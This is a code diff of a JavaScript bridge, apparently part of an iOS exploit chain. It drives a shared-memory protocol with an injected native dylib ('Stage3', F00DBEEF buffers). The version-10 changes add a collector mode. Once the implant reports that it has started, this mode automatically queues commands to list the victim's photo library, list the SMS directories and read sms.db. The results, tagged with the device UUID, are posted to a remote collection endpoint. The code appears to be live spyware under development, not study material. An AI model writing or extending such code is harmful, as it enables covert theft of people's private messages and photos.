@@ -1,21 +1,15 @@
 /**
- * real_bridge.js v8 — 主动驱动 stock bootstrap 共享内存链
+ * real_bridge.js v10 — stock bootstrap + real_collector 双模式
  *
- * 协议：
- *   D0=0 IDLE  + size>0 + F00D → 置 READY(3) + kick _process
- *   D0=1 URL   → Stage3 wA 下载
- *   D0=2 DL
- *   D0=3 READY → kick _process 消费；上报快照
- *   D0=7 POST  → Stage3 TA 改写到 /api/collect/report
- *   D0=4 ERROR / D0=5 EXIT → 上报
+ * stock: 只驱动 F00DBEEF READY/kick，上报 snapshot
+ * real_collector: 识别 dylib_started 后 FEED cmd 采相册/短信路径
  *
- * 不写 cmd:/FEED=6（与 Stage3 TA 冲突）。
- * 重入只走 __stage3KickProcess（不清空缓冲）。
+ * 协议 D0: 0 IDLE 1 URL 2 DL 3 READY 4 ERROR 5 EXIT 6 FEED/TA 7 POST
  */
 (function () {
     "use strict";
 
-    var S = { IDLE: 0, URL: 1, DL: 2, READY: 3, ERROR: 4, EXIT: 5, TA: 6, POST: 7 };
+    var S = { IDLE: 0, URL: 1, DL: 2, READY: 3, ERROR: 4, EXIT: 5, FEED: 6, POST: 7 };
     var _started = false;
     var _deviceUuid = "";
     var _d = null;
@@ -28,6 +22,12 @@
     var _lastKickAt = 0;
     var _lastKickKey = "";
     var _f00dConsumed = false;
+    var _collectorMode = false;
+    var _cmdQueue = [];
+    var _cmdBusy = false;
+    var _cmdSentAt = 0;
+    var _pendingCat = "";
+    var _autoStarted = false;
 
     function log(m) {
         try {
@@ -37,7 +37,7 @@
     }
 
     function nameD0(n) {
-        return ({ 0: "IDLE", 1: "URL", 2: "DL", 3: "READY", 4: "ERROR", 5: "EXIT", 6: "TA", 7: "POST" })[n] || ("?" + n);
+        return ({ 0: "IDLE", 1: "URL", 2: "DL", 3: "READY", 4: "ERROR", 5: "EXIT", 6: "FEED", 7: "POST" })[n] || ("?" + n);
     }
 
     function getBuffer() {
@@ -101,9 +101,7 @@
 
     function parseF00D(bytes) {
         if (!bytes || bytes.length < 8) return null;
-        if (bytes[0] !== 0xef || bytes[1] !== 0xbe || bytes[2] !== 0x0d || bytes[3] !== 0xf0) {
-            return null;
-        }
+        if (bytes[0] !== 0xef || bytes[1] !== 0xbe || bytes[2] !== 0x0d || bytes[3] !== 0xf0) return null;
         var n = bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24);
         var entries = [];
         for (var i = 0; i < n && i < 32; i++) {
@@ -142,7 +140,7 @@
                 category: category,
                 data_key: category,
                 payload: payload,
-                source: "bootstrap_sharedmem",
+                source: _collectorMode ? "real_collector" : "bootstrap_sharedmem",
                 collected_at: new Date().toISOString()
             }),
             keepalive: true
@@ -168,6 +166,13 @@
         return {};
     }
 
+    function tryParseJson(text) {
+        if (!text) return null;
+        var s = text.replace(/^\uFEFF/, "").trim();
+        if (!s || s.charAt(0) !== "{") return null;
+        try { return JSON.parse(s); } catch (e) { return null; }
+    }
+
     function reportBufferSnapshot(reason) {
         if (!_d) return;
         var size = _d[1] >>> 0;
@@ -180,6 +185,24 @@
         var f00d = parseF00D(bytes);
         var cstr = readCString();
         var info = iosInfo();
+        var j = tryParseJson(cstr);
+
+        if (j && (j.source === "real_collector" || (j.ok && j.msg === "dylib_started"))) {
+            if (!_collectorMode) {
+                _collectorMode = true;
+                window.__REAL_COLLECTOR_MODE__ = true;
+                log("collector mode ON");
+            }
+            var cat = j.cmd || j.event || j.category || "collector_json";
+            if (_pendingCat) {
+                cat = _pendingCat;
+                _pendingCat = "";
+            }
+            postCollect(cat, j);
+            if (j.event === "boot" || j.msg === "dylib_started") maybeStartAutoCollect();
+            _cmdBusy = false;
+            return;
+        }
 
         var payload = {
             reason: reason,
@@ -215,36 +238,32 @@
     }
 
     function sizeSane(size) {
-        // 拒绝 URL 态垃圾 size（曾见 1886680168）
-        return size > 8 && size < 0x1000000 && size < (_u8 ? _u8.length - 8 : 0x1000000);
+        return size > 0 && size < 0x1000000 && size < (_u8 ? _u8.length - 8 : 0x1000000);
     }
 
     function kick(reason) {
         var now = Date.now();
         var d0 = _d ? (_d[0] >>> 0) : -1;
         var size = _d ? (_d[1] >>> 0) : -1;
-        // 禁止在 URL/DL/POST 中 kick
-        if (d0 === S.URL || d0 === S.DL || d0 === S.POST || d0 === S.TA) {
+        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) {
             ensureCtrl();
             return false;
         }
-        if (!sizeSane(size)) {
+        if (d0 !== S.FEED && !sizeSane(size) && size !== 0) {
             log("kick skip insane size=" + size + " d0=" + d0);
             return false;
         }
         var key = reason + ":" + d0 + ":" + size;
-        if (key === _lastKickKey && now - _lastKickAt < 1500) return false;
-        if (_kickCount >= 24) {
-            if (_kickCount === 24) log("kick cap reached");
+        if (key === _lastKickKey && now - _lastKickAt < 800) return false;
+        if (_kickCount >= 40) {
+            if (_kickCount === 40) log("kick cap reached");
             _kickCount++;
             return false;
         }
         _lastKickKey = key;
         _lastKickAt = now;
         _kickCount++;
-
         ensureCtrl();
-
         if (typeof window.__stage3KickProcess === "function") {
             log("kick via __stage3KickProcess #" + _kickCount + " " + reason);
             return !!window.__stage3KickProcess(reason);
@@ -257,23 +276,90 @@
         return false;
     }
 
+    function writeFeed(cmd) {
+        if (!_d || !_u8) return false;
+        var s = "cmd:" + cmd;
+        var i;
+        for (i = 0; i < s.length && (8 + i) < _u8.length; i++) {
+            _u8[8 + i] = s.charCodeAt(i) & 0xff;
+        }
+        if (8 + i < _u8.length) _u8[8 + i] = 0;
+        _d[1] = s.length;
+        _d[0] = S.FEED;
+        window.__REAL_COLLECTOR_MODE__ = true;
+        log("FEED " + s);
+        return true;
+    }
+
+    function queueCmd(cmd, category) {
+        _cmdQueue.push({ cmd: cmd, category: category || cmd });
+    }
+
+    function maybeStartAutoCollect() {
+        if (_autoStarted) return;
+        _autoStarted = true;
+        log("auto collect queue");
+        queueCmd("ping", "dylib_ping");
+        queueCmd("list_dcim", "photos_list");
+        queueCmd("list_dir:/var/mobile/Library/SMS", "sms_dir");
+        queueCmd("list_dir:/private/var/mobile/Library/SMS", "sms_dir2");
+        queueCmd("read_file:/var/mobile/Library/SMS/sms.db", "sms_db");
+        queueCmd("read_file:/private/var/mobile/Library/SMS/sms.db", "sms_db2");
+        queueCmd("list_dir:/tmp", "list_tmp");
+    }
+
+    function pumpCmd() {
+        if (!_collectorMode || _cmdBusy) return;
+        if (!_cmdQueue.length) return;
+        var d0 = _d[0] >>> 0;
+        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) return;
+        var item = _cmdQueue.shift();
+        _cmdBusy = true;
+        _pendingCat = item.category;
+        _cmdSentAt = Date.now();
+        if (!writeFeed(item.cmd)) {
+            _cmdBusy = false;
+            return;
+        }
+        kick("feed-" + item.cmd);
+    }
+
     function drive() {
         if (!_d && !attach()) return;
         var d0 = _d[0] >>> 0;
         var size = _d[1] >>> 0;
         var f00d = hasF00D();
 
-        // URL/DL/POST：只保活 wA，绝不 kick
-        if (d0 === S.URL || d0 === S.DL || d0 === S.POST || d0 === S.TA) {
+        if (d0 === S.URL || d0 === S.DL || d0 === S.POST) {
             ensureCtrl();
             return;
         }
 
-        if (!sizeSane(size)) {
+        // collector 模式下 FEED 交给 native，不在这里改
+        if (_collectorMode && d0 === S.FEED) {
+            if (Date.now() - _cmdSentAt > 2000) {
+                kick("feed-retry");
+                _cmdSentAt = Date.now();
+            }
             return;
         }
 
-        // 核心：IDLE + F00DBEEF 未消费 → READY + kick
+        if (_collectorMode) {
+            // READY 结果
+            if (d0 === S.READY && size > 0 && !f00d) {
+                reportBufferSnapshot("collector_ready");
+                _cmdBusy = false;
+                return;
+            }
+            // 空闲则下发命令
+            if ((d0 === S.IDLE || d0 === S.READY) && !f00d) {
+                pumpCmd();
+            }
+            return;
+        }
+
+        if (!sizeSane(size)) return;
+
         if (d0 === S.IDLE && f00d && !_f00dConsumed) {
             log("drive IDLE+F00D → READY size=" + size);
             _d[0] = S.READY;
@@ -282,25 +368,22 @@
             return;
         }
 
-        // READY + F00D：让 native 消费
         if (d0 === S.READY && f00d) {
             kick("ready-f00d");
             return;
         }
 
-        // READY 非 F00D：结果包，只上报，轻 kick 一次
-        if (d0 === S.READY && size > 100 && !f00d) {
+        if (d0 === S.READY && size > 20 && !f00d) {
             reportBufferSnapshot("ready_result");
             return;
         }
 
-        // 包被消费：size 变小或 magic 消失
-        if (_f00dConsumed === false && size < 100) {
+        if (_f00dConsumed === false && size < 100 && size > 0 && !f00d) {
             _f00dConsumed = true;
             log("payload likely consumed size=" + size);
             reportBufferSnapshot("consumed");
         }
-        if (d0 === S.IDLE && size > 100 && !f00d) {
+        if (d0 === S.IDLE && size > 20 && !f00d) {
             reportBufferSnapshot("idle_text");
         }
     }
@@ -316,24 +399,25 @@
             log("D0 " + _lastD0 + "→" + d0 + " (" + nameD0(d0) + ") size=" + size);
             _lastD0 = d0;
             reportBufferSnapshot("state_change");
-            // 状态变化时立刻推进
             drive();
-        } else {
-            // 稳态也定期推进（处理异步喂包）
-            if (_ticks % 2 === 0) drive();
+        } else if (_ticks % 2 === 0) {
+            drive();
         }
 
-        if (d0 === S.READY && size > 0) {
+        if (d0 === S.READY && size > 0 && !hasF00D()) {
             reportBufferSnapshot("ready");
         }
-        if (d0 === S.ERROR) {
-            reportBufferSnapshot("error");
-        }
-        if (d0 === S.EXIT) {
-            reportBufferSnapshot("exit");
+        if (d0 === S.ERROR) reportBufferSnapshot("error");
+        if (d0 === S.EXIT) reportBufferSnapshot("exit");
+
+        if (_cmdBusy && Date.now() - _cmdSentAt > 8000) {
+            log("cmd timeout, continue");
+            _cmdBusy = false;
+            _pendingCat = "";
         }
 
         if (_ticks % 10 === 1) ensureCtrl();
+        if (_collectorMode && _ticks % 3 === 0) pumpCmd();
     }
 
     function start(opts) {
@@ -349,8 +433,7 @@
             }
         } catch (e) {}
 
-        log("start ACTIVE bootstrap chain device=" + _deviceUuid);
-
+        log("start v10 device=" + _deviceUuid);
         ensureCtrl();
 
         var tries = 0;
@@ -361,16 +444,25 @@
                 reportBufferSnapshot("boot");
                 postCollect("chain_meta", {
                     ok: true,
-                    mode: "bootstrap_active_driver_v8",
+                    mode: "real_bridge_v10",
                     ios: iosInfo().ios,
                     pac: iosInfo().pac,
                     d0: _d[0] >>> 0,
                     size: _d[1] >>> 0,
-                    note: "force READY+kick on IDLE F00DBEEF; no FEED"
+                    note: "collector FEED after dylib_started"
                 });
-                // 立刻推进一次（覆盖你当前日志卡点）
                 drive();
-                _timer = setInterval(tick, 500);
+                // 主动 kick 一次，让 one-shot collector 回 boot
+                setTimeout(function () {
+                    if (!_collectorMode && _d) {
+                        var d0 = _d[0] >>> 0;
+                        if (d0 === S.IDLE || d0 === S.READY) {
+                            if (hasF00D()) _d[0] = S.READY;
+                            kick("boot-probe");
+                        }
+                    }
+                }, 400);
+                _timer = setInterval(tick, 400);
             } else if (tries < 80) {
                 setTimeout(boot, 200);
             } else {
@@ -392,13 +484,12 @@
         attach: attach,
         kick: kick,
         drive: drive,
-        writeFeed: function () {
-            log("writeFeed disabled — use stock bootstrap URL/POST only");
-            return false;
-        },
+        writeFeed: writeFeed,
+        queueCmd: queueCmd,
         reenterIfNeeded: function () {
             return kick("manual-reenter");
-        }
+        },
+        isCollector: function () { return _collectorMode; }
     };
 
     if (window.__REAL_BRIDGE_AUTO__) {
